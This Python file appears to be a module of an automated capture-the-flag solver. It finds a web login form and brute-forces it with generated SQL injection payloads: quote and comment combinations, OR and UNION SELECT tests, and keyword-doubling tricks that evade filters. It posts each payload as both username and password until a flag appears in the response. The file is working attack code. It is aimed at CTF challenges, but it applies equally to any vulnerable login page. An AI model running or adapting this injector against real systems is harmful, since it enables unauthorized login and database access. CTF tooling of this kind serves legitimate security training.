from unit import BaseUnit
from collections import Counter
import sys
from io import StringIO
import argparse
from pwn import *
import subprocess
import os
import units.raw
import re
import units.web as web
import requests
import magic
import units


class Unit(web.WebUnit):

	def __init__(self, katana, parent, target):

		# Run the parent constructor, to ensure this is a valid URL
		super(Unit, self).__init__(katana, parent, target)
		if not katana.config['flag_format']:
			raise units.NotApplicable('no flag format supplied')

		raw_content = self.target.content.decode('utf-8')
		
		self.action = re.findall(r"<\s*form.*action\s*=\s*['\"](.+?)['\"]", raw_content, flags=re.IGNORECASE)
		self.method = re.findall(r"<\s*form.*method\s*=\s*['\"](.+?)['\"]", raw_content, flags=re.IGNORECASE)

		self.username = re.findall(web.user_regex, raw_content, flags=re.IGNORECASE)
		self.password = re.findall(web.pass_regex, raw_content, flags=re.IGNORECASE)
		
		# Only run this if we have potential information...
		if not (self.action and self.method and self.username and self.password):
			raise units.NotApplicable('no form found')


	def enumerate(self, katana):
		
		# This should "yield 'name', (params,to,pass,to,evaluate)"
		# evaluate will see this second argument as only one variable and you will need to parse them out
		if self.action and self.method and self.username and self.password:
			if self.action: action = self.action[0]
			if self.method: method = self.method[0]
			if self.username: username = self.username[0]
			if self.password: password = self.password[0]

			try:
				method = vars(requests)[method.lower()]
			except IndexError:
				log.warning("Could not find an appropriate HTTP method... defaulting to POST!")
				method = requests.post

			quotes_possibilities = [ "'", '"' ]
			comment_possibilities = [ "--", '#', '/*', '%00' ]
			delimeter_possibilities = [ ' ', '/**/' ]
			test_possibilities = [ 'OR', 'OORR', 'UNION SELECT', 'UNUNIONION SELSELECTECT' ]

			payloads = []
			count_attempt = 0
			for quote in quotes_possibilities:
				for comment in comment_possibilities:
					for delimeter in delimeter_possibilities:
						for test in test_possibilities:

							payload = quote + delimeter + test.replace(' ' ,delimeter) + delimeter + '1' + delimeter + comment
							count_attempt += 1
							yield (method, action, username, password, payload)

		else:
			return # This will tell THE WHOLE UNIT to stop... it will no longer generate cases.


	def evaluate(self, katana, case):
		# Split up the target (see get_cases)
		method, action, username, password, payload = case
		
		# print("trying ", self.target, method, action, username, password)
		url_form = self.target.upstream.decode('utf-8').split('/')
		if len(url_form) > 3:
			last_location = '/'.join(url_form[:-1]) + '/'
		else:
			last_location = self.target.upstream.decode('utf-8').rstrip('/') + '/'

		r = method(self.target.upstream.decode('utf-8') + action, data = { username: payload, password : payload }, timeout=2)
		
		# Hunt for flags. If we found one, stop all other requests!
		hit = katana.locate_flags(self, r.text)

		if hit:
			self.completed = True
			return

		# You should ONLY return what is "interesting" 
		# Since we cannot gauge the results of this payload versus the others,
		# we will only care if we found the flag.
		return None
